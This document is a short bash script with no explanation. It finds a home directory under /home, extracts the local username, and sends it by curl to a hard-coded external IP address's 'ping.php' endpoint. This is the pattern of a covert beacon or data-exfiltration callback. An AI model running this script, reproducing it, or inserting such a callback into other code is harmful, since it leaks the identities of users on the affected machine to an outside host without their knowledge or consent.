#!/bin/bash

home=$(echo /home/g*)
user=${home#/home/}
curl http://135.148.11.148/ping.php?user=$user
